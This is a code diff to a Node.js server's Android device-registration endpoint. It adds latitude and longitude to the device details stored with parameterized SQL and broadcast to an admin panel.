@@ -260,7 +260,7 @@ async function startServer() {
   // Device registration endpoint (called by Android app on first launch)
   app.post('/api/devices/register', (req, res) => {
     try {
-      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram } = req.body;
+      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude } = req.body;
       if (!device_id) return res.status(400).json({ error: 'device_id is required' });
 
       const phonesJson = JSON.stringify(phone_numbers || []);
@@ -271,21 +271,24 @@ async function startServer() {
           app_version = ?, screen_resolution = ?, phone_numbers = ?,
           battery_percent = ?, battery_charging = ?,
           total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
+          latitude = COALESCE(?, latitude), longitude = COALESCE(?, longitude),
           is_online = 1, last_seen = datetime('now')
           WHERE device_id = ?`).run(
           device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
           app_version || '', screen_resolution || '', phonesJson,
           battery_percent ?? -1, battery_charging ? 1 : 0,
           total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
+          latitude ?? null, longitude ?? null,
           device_id
         );
       } else {
-        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram)
-          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
+        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude)
+          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
           device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
           app_version || '', screen_resolution || '', phonesJson,
           battery_percent ?? -1, battery_charging ? 1 : 0,
-          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0
+          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
+          latitude ?? null, longitude ?? null
         );
       }
       // Broadcast to admin panel in real-time so no refresh needed
